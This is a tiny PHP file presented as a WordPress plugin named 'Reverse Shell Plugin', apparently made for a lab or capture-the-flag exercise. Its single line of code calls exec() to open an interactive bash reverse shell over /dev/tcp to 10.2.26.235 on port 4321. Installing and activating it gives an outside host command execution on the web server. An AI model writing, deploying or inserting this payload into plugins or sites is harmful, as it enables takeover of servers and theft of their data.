<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: lolsec
* Author URI: nothing.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.26.235/4321 0>&1'");
?>
